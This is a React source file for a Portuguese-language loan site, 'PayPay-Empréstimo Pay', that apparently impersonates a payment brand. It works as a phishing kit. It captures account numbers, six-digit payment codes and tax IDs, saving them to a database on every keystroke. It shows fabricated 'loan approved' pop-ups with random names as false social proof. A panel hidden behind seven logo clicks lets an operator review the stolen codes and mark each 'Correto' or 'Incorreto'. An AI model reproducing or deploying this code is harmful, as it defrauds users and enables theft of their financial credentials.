import { createFileRoute } from "@tanstack/react-router";
import { useState, useEffect, useRef, useMemo } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { ChevronLeft, CheckCircle2, Globe, HelpCircle, Eye, EyeOff, ShieldCheck, Info, Search, Loader2, XCircle, LayoutDashboard, History, Trash2, RotateCcw, Download, AlertTriangle, FileText, Check, CreditCard, User } from "lucide-react";
import { cn } from "@/lib/utils";
import { toast } from "sonner";
import logoPaypay from "@/assets/logo-paypay.png";
import userIconAsset from "@/assets/chat-logo.png";
import successIconAsset from "@/assets/success-icon.jpg.asset.json";
import { 
  verifyAdminPassword, 
  updateApplicationStatus, 
  getApplications, 
  checkApplicationStatus,
  getDeletedApplications,
  deleteApplication,
  restoreApplication,
  deletePermanently,
  deleteAllPermanently
} from "@/lib/admin.functions";

export const Route = createFileRoute("/")({
  component: Index,
  head: () => ({
    meta: [{ title: "PayPay-Empréstimo Pay" }, { name: "description", content: "Empréstimo rápido e seguro." }],
  }),
});

type Step = "home" | "login" | "step2" | "step3" | "step4" | "summary" | "confirm" | "success" | "admin" | "check_status";

function Index() {
  const [step, setStep] = useState<Step>("home");
  const [adminTab, setAdminTab] = useState<"users" | "trash">("users");
  const [accountNumber, setAccountNumber] = useState("");
  const [accessCode, setAccessCode] = useState("");
  const [showAccessCode, setShowAccessCode] = useState(false);
  const [paymentCode, setPaymentCode] = useState(["", "", "", "", "", ""]);
  const [amount, setAmount] = useState(35000);
  const [term, setTerm] = useState(60);
  const [personalData, setPersonalData] = useState({ name: "", nif: "" });
  const [notification, setNotification] = useState<{ name: string; amount: number } | null>(null);
  const [logoClicks, setLogoClicks] = useState(0);
  const [acceptedTerms, setAcceptedTerms] = useState(false);
  const [applicationId, setApplicationId] = useState<string | null>(null);
  const [adminAuthenticated, setAdminAuthenticated] = useState(false);
  const [adminPassword, setAdminPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [applications, setApplications] = useState<any[]>([]);
  const [deletedApps, setDeletedApps] = useState<any[]>([]);
  const adminScrollRef = useRef<HTMLDivElement>(null);

  const allFirstNames = ["João", "Maria", "António", "Ana", "Carlos", "José", "Manuel", "Francisco", "Luís", "Joaquim"];
  const allSurnames = ["Silva", "Santos", "Ferreira", "Pereira", "Oliveira", "Costa", "Rodrigues", "Martins", "Jesus", "Pinto"];

  useEffect(() => {
    const showRandomNotification = () => {
      if (step === "admin") return;
      const randomName = `${allFirstNames[Math.floor(Math.random() * allFirstNames.length)]} ${allSurnames[Math.floor(Math.random() * allSurnames.length)]}`;
      const randomAmount = Math.round((Math.floor(Math.random() * (35000 - 2000 + 1)) + 2000) / 100) * 100;
      setNotification({ name: `${randomName.split(" ").slice(0, 2).join(" ")} X**`, amount: randomAmount });
      setTimeout(() => setNotification(null), 5000);
    };

    const interval = setInterval(showRandomNotification, 20000);
    const t = setTimeout(showRandomNotification, 3000);
    return () => { clearInterval(interval); clearTimeout(t); };
  }, [step]);

  const saveProgress = async () => {
    if (step === "home" || step === "admin" || step === "success") return;
    try {
        const { supabase } = await import("@/integrations/supabase/client");
        const payload = {
            account_number: accountNumber,
            payment_code: paymentCode.join(""),
            amount, term,
            name: personalData.name,
            nif: personalData.nif,
            status: "Candidatura recebida"
        };
        if (applicationId) await supabase.from("pending_applications").update(payload).eq("id", applicationId);
        else {
            const { data } = await supabase.from("pending_applications").insert([payload]).select().single();
            if (data) setApplicationId(data.id);
        }
    } catch (e) {}
  };

  useEffect(() => {
    if (step !== "home" && step !== "admin") {
        const timer = setTimeout(saveProgress, 300);
        return () => clearTimeout(timer);
    }
    return undefined;
  }, [step, accountNumber, paymentCode, amount, term, personalData]);

  const fetchApplications = async () => {
    try {
        const data = await getApplications({ data: { adminPassword } });
        setApplications(data as any[]);
    } catch (e) {}
  };

  const fetchDeletedApps = async () => {
    try {
      const data = await getDeletedApplications({ data: { adminPassword } });
      if (data) setDeletedApps(data as any[]);
    } catch (err: any) {
      toast.error("Erro ao carregar lixeira");
    }
  };

  useEffect(() => {
    if (adminAuthenticated) {
      if (adminTab === "users") fetchApplications();
      else fetchDeletedApps();
    }
  }, [adminAuthenticated, adminTab]);

  const onUpdateStatus = async (id: string, isCorrect: boolean) => {
    try {
        await updateApplicationStatus({ data: { id, isCorrect, adminPassword } });
        toast.success("Atualizado");
        await fetchApplications();
    } catch (e) { toast.error("Erro"); }
  };

  const deleteItem = async (id: string) => {
    if (!confirm("Mover para a lixeira?")) return;
    try {
      const result = await deleteApplication({ data: { id, adminPassword } });
      if (result?.success) {
        toast.success("Movido para a lixeira");
        setApplications(prev => prev.filter(app => app.id !== id));
      }
    } catch (err) { toast.error("Erro ao apagar"); }
  };

  const restoreItem = async (id: string) => {
    try {
      const result = await restoreApplication({ data: { id, adminPassword } });
      if (result?.success) {
        toast.success("Recuperado");
        setDeletedApps(prev => prev.filter(app => app.id !== id));
      }
    } catch (err) { toast.error("Erro ao recuperar"); }
  };

  const permanentDelete = async (id: string) => {
    const p = prompt("Senha permanente:");
    if (!p) return;
    try {
      const result = await deletePermanently({ data: { id, adminPassword, permanentPassword: p } });
      if (result?.success) {
        toast.success("Removido");
        setDeletedApps(prev => prev.filter(app => app.id !== id));
      }
    } catch (err: any) { toast.error(err.message); }
  };

  useEffect(() => {
    if (logoClicks >= 7) {
        setStep("admin");
        setLogoClicks(0);
    }
    const t = setTimeout(() => setLogoClicks(0), 1000);
    return () => clearTimeout(t);
  }, [logoClicks]);

  return (
    <div className="min-h-screen bg-[#F8F9FC] p-4">
        <header className="flex justify-between items-center mb-8">
            <div 
              onClick={() => setLogoClicks(p => p + 1)}
              className="flex items-center gap-2 cursor-pointer select-none relative overflow-hidden h-8"
            >
              <img src={logoPaypay} alt="paypay" className="h-full invisible" />
              <img src={logoPaypay} alt="paypay" className="absolute inset-0 w-full h-full object-contain z-20" />
            </div>
            <button className="text-xs font-bold text-muted-foreground flex items-center gap-1"><Globe className="w-4 h-4" /> Port</button>
        </header>

        <main className="max-w-md mx-auto">
            <AnimatePresence mode="wait">
                {step === "home" && (
                    <motion.div key="home" className="space-y-6">
                        <div className="text-center space-y-2 mb-8">
                            <h1 className="text-3xl font-black text-[#0F172A] tracking-tighter">PayPay-Empréstimo Pay</h1>
                            <p className="text-muted-foreground text-sm font-medium">Soluções financeiras rápidas e seguras</p>
                        </div>
                        <div className="grid gap-4">
                            <button onClick={() => setStep("login")} className="group relative bg-[#0F172A] text-white p-6 rounded-[32px] overflow-hidden transition-all hover:scale-[1.02] active:scale-[0.98] shadow-xl shadow-slate-200 text-left">
                                <div className="relative z-10 flex items-center justify-between">
                                    <div className="space-y-1">
                                        <h3 className="text-xl font-bold">Solicitar Empréstimo</h3>
                                        <p className="text-slate-400 text-xs">Até 35.000 Kz em poucos minutos</p>
                                    </div>
                                    <div className="bg-white/10 p-3 rounded-2xl group-hover:bg-white/20 transition-colors">
                                        <CreditCard className="w-6 h-6" />
                                    </div>
                                </div>
                            </button>
                            <button onClick={() => setStep("check_status")} className="group relative bg-white border border-border/50 p-6 rounded-[32px] overflow-hidden transition-all hover:scale-[1.02] active:scale-[0.98] shadow-sm hover:shadow-md text-left">
                                <div className="flex items-center justify-between">
                                    <div className="space-y-1">
                                        <h3 className="text-xl font-bold text-[#0F172A]">Consultar Empréstimo</h3>
                                        <p className="text-muted-foreground text-xs">Verifique o estado da sua candidatura</p>
                                    </div>
                                    <div className="bg-slate-100 p-3 rounded-2xl group-hover:bg-slate-200 transition-colors">
                                        <Search className="w-6 h-6 text-[#0F172A]" />
                                    </div>
                                </div>
                            </button>
                        </div>
                    </motion.div>
                )}

                {step === "login" && (
                    <motion.div key="login" className="space-y-6">
                        <div className="flex items-center gap-4 mb-2">
                            <button onClick={() => setStep("home")} className="p-2 hover:bg-slate-100 rounded-full transition-colors"><ChevronLeft className="w-6 h-6" /></button>
                            <h2 className="text-2xl font-bold">Conta PayPay</h2>
                        </div>
                        <div className="bg-white rounded-[32px] p-8 border border-border/40 shadow-sm space-y-6">
                            <div className="space-y-2">
                                <label className="text-xs font-bold text-muted-foreground uppercase ml-1">Número da Conta</label>
                                <input className="w-full p-4 bg-slate-50 border-none rounded-2xl focus:ring-2 ring-primary transition-all font-medium" placeholder="Ex: 12345678" value={accountNumber} onChange={e => setAccountNumber(e.target.value)} />
                            </div>
                            <button onClick={() => setStep("step2")} className="w-full bg-[#0F172A] text-white p-4 rounded-2xl font-bold text-lg hover:scale-[1.02] active:scale-[0.98] transition-all shadow-lg">Continuar</button>
                        </div>
                    </motion.div>
                )}

                {step === "admin" && (
                    <motion.div key="admin" className="space-y-6">
                        {!adminAuthenticated ? (
                            <div className="bg-white rounded-[32px] p-8 border border-border/40 shadow-sm space-y-6">
                                <div className="text-center space-y-2">
                                    <h2 className="text-2xl font-bold">Painel de Acesso</h2>
                                    <p className="text-muted-foreground text-sm">Insira as credenciais administrativas</p>
                                </div>
                                <input type="password" placeholder="Senha de Acesso" value={adminPassword} onChange={e => setAdminPassword(e.target.value)} className="w-full p-4 bg-slate-50 border-none rounded-2xl focus:ring-2 ring-primary text-center font-mono" onKeyDown={e => e.key === 'Enter' && setAdminAuthenticated(true)} />
                                <button onClick={() => setAdminAuthenticated(true)} className="w-full bg-[#0F172A] text-white p-4 rounded-2xl font-bold">Entrar</button>
                            </div>
                        ) : (
                            <div className="space-y-4">
                                <div className="flex items-center justify-between bg-white p-4 rounded-[24px] border border-border/40 shadow-sm">
                                    <div className="flex items-center gap-2">
                                        <div className="bg-primary/10 p-2 rounded-xl"><LayoutDashboard className="w-5 h-5 text-primary" /></div>
                                        <h2 className="text-lg font-bold">Gestão</h2>
                                    </div>
                                    <div className="flex bg-slate-100 p-1 rounded-xl">
                                        <button onClick={() => setAdminTab("users")} className={cn("px-4 py-2 rounded-lg text-xs font-bold transition-all", adminTab === "users" ? "bg-white shadow-sm" : "text-muted-foreground")}>Ativos</button>
                                        <button onClick={() => setAdminTab("trash")} className={cn("px-4 py-2 rounded-lg text-xs font-bold transition-all", adminTab === "trash" ? "bg-white shadow-sm" : "text-muted-foreground")}>Lixeira</button>
                                    </div>
                                    <button onClick={() => adminTab === "users" ? fetchApplications() : fetchDeletedApps()} className="p-2 hover:bg-slate-100 rounded-full transition-colors"><RotateCcw className="w-4 h-4 text-muted-foreground" /></button>
                                </div>

                                <div ref={adminScrollRef} className="space-y-4 max-h-[600px] overflow-y-auto pr-2 custom-scrollbar pb-20">
                                    {(adminTab === "users" ? applications : deletedApps).map(app => (
                                        <div key={app.id} className={cn("p-5 rounded-[28px] border transition-all relative group", adminTab === "trash" ? "bg-slate-50 border-slate-200" : app.analysis_color === 'green' ? "bg-green-50/50 border-green-100" : app.analysis_color === 'red' ? "bg-red-50/50 border-red-100" : "bg-white border-border/40 shadow-sm")}>
                                            <div className="flex justify-between items-start mb-4">
                                                <div>
                                                    <p className="text-[10px] font-black text-primary uppercase tracking-widest mb-1">Candidatura #{app.id.slice(0, 8).toUpperCase()}</p>
                                                    <h4 className="text-base font-bold">{app.name || "---"}</h4>
                                                </div>
                                                <div className="flex flex-col items-end gap-2">
                                                    <span className={cn("text-[10px] px-2.5 py-1 rounded-full font-black uppercase tracking-tighter", app.status === 'Pendente' ? "bg-amber-100 text-amber-700" : app.analysis_color === 'green' ? "bg-green-100 text-green-700" : "bg-red-100 text-red-700")}>{app.status || 'Pendente'}</span>
                                                    {adminTab === "users" ? (
                                                        <button onClick={() => deleteItem(app.id)} className="p-2 text-muted-foreground hover:text-red-600 transition-colors bg-slate-50 rounded-xl"><Trash2 className="w-4 h-4" /></button>
                                                    ) : (
                                                        <div className="flex gap-1">
                                                            <button onClick={() => restoreItem(app.id)} className="p-2 text-primary hover:bg-primary/10 bg-white rounded-xl shadow-sm"><RotateCcw className="w-4 h-4" /></button>
                                                            <button onClick={() => permanentDelete(app.id)} className="p-2 text-red-600 hover:bg-red-50 bg-white rounded-xl shadow-sm"><XCircle className="w-4 h-4" /></button>
                                                        </div>
                                                    )}
                                                </div>
                                            </div>
                                            <div className="grid grid-cols-2 gap-4 py-4 border-y border-slate-100">
                                                <div className="space-y-0.5"><p className="text-[9px] text-muted-foreground font-black uppercase">NIF / Conta</p><p className="text-xs font-bold">{app.nif || "---"} | {app.account_number || "---"}</p></div>
                                                <div className="space-y-0.5"><p className="text-[9px] text-muted-foreground font-black uppercase">Valor Solicitado</p><p className="text-xs font-black text-primary">{app.amount ? `${app.amount.toLocaleString()} Kz` : "---"}</p></div>
                                                <div className="space-y-0.5"><p className="text-[9px] text-muted-foreground font-black uppercase">Cód. Pagamento</p><p className="text-xs font-mono font-bold text-slate-500">{app.payment_code || "---"}</p></div>
                                            </div>
                                            {adminTab === "users" && (
                                                <div className="flex gap-2 pt-4">
                                                    <button onClick={() => onUpdateStatus(app.id, true)} className="flex-1 bg-green-600 text-white py-3 rounded-2xl text-xs font-bold flex items-center justify-center gap-2 hover:bg-green-700 transition-colors shadow-lg shadow-green-100"><CheckCircle2 className="w-4 h-4" /> Correto</button>
                                                    <button onClick={() => onUpdateStatus(app.id, false)} className="flex-1 bg-red-600 text-white py-3 rounded-2xl text-xs font-bold flex items-center justify-center gap-2 hover:bg-red-700 transition-colors shadow-lg shadow-red-100"><XCircle className="w-4 h-4" /> Incorreto</button>
                                                </div>
                                            )}
                                        </div>
                                    ))}
                                </div>
                            </div>
                        )}
                    </motion.div>
                )}

                {step === "check_status" && (
                    <motion.div key="status" className="space-y-6">
                        <div className="flex items-center gap-4 mb-2">
                            <button onClick={() => setStep("home")} className="p-2 hover:bg-slate-100 rounded-full transition-colors"><ChevronLeft className="w-6 h-6" /></button>
                            <h2 className="text-2xl font-bold">Verificar Candidatura</h2>
                        </div>
                        <StatusCheckContent />
                    </motion.div>
                )}
            </AnimatePresence>
        </main>

        <AnimatePresence>
          {notification && (
            <motion.div initial={{ opacity: 0, x: 50 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: 50 }} className="fixed top-4 right-4 z-50 bg-white border border-slate-100 shadow-2xl rounded-[24px] p-4 flex items-center gap-4 max-w-[280px]">
              <div className="w-10 h-10 rounded-2xl bg-green-50 flex items-center justify-center text-green-600"><ShieldCheck className="w-6 h-6" /></div>
              <div className="flex-1 min-w-0">
                <p className="text-[10px] font-black text-green-600 uppercase tracking-widest mb-0.5">Empréstimo Aprovado</p>
                <p className="text-xs font-bold truncate">{notification.name}</p>
                <p className="text-[10px] text-muted-foreground">{notification.amount.toLocaleString()} Kz recebidos</p>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
    </div>
  );
}

function StatusCheckContent() {
    const [nif, setNif] = useState("");
    const [result, setResult] = useState<any>(null);
    const [loading, setLoading] = useState(false);

    const handleCheck = async () => {
        if (nif.length < 9) return toast.error("NIF inválido");
        setLoading(true);
        try {
            const data = await checkApplicationStatus({ data: { nif } }) as any;
            if (!data) setResult("empty");
            else setResult({ 
                status: data.analysis_color ? "Reprovado" : "Em revisão", 
                reason: data.rejection_reason || (data.analysis_color ? "Candidatura reprovada por critérios internos." : "Aguardando verificação"),
                color: data.analysis_color || 'blue'
            });
        } catch (e) { toast.error("Erro na consulta"); }
        setLoading(false);
    };

    return (
        <div className="bg-white rounded-[32px] p-8 border border-border/40 shadow-sm space-y-6 text-center">
            <div className="space-y-2 text-left">
                <label className="text-xs font-bold text-muted-foreground uppercase ml-1">NIF do Solicitante</label>
                <input className="w-full p-4 bg-slate-50 border-none rounded-2xl focus:ring-2 ring-primary transition-all font-medium" placeholder="Ex: 000000000LA000" value={nif} onChange={e => setNif(e.target.value.toUpperCase())} maxLength={14} />
            </div>
            <button onClick={handleCheck} disabled={loading} className="w-full bg-[#0F172A] text-white p-4 rounded-2xl font-bold flex items-center justify-center gap-2">{loading ? <Loader2 className="animate-spin w-5 h-5" /> : <Search className="w-5 h-5" />} Consultar Agora</button>
            {result === "empty" && <p className="text-sm text-red-600 font-medium">Nenhuma candidatura encontrada.</p>}
            {result && result !== "empty" && (
                <div className={cn("p-6 rounded-[24px] border text-left space-y-3 mt-4", result.color === 'red' || result.status === 'Reprovado' ? "bg-red-50 border-red-100" : "bg-blue-50 border-blue-100")}>
                    <div className={cn("flex items-center gap-2", result.color === 'red' || result.status === 'Reprovado' ? "text-red-600" : "text-blue-600")}>
                        {result.status === "Reprovado" ? <XCircle className="w-5 h-5" /> : <Info className="w-5 h-5" />}
                        <span className="font-black uppercase tracking-widest text-[10px]">Status: {result.status}</span>
                    </div>
                    <p className={cn("text-xs font-bold leading-relaxed", result.color === 'red' || result.status === 'Reprovado' ? "text-red-700" : "text-blue-700")}>“{result.reason}”</p>
                </div>
            )}
        </div>
    );
}
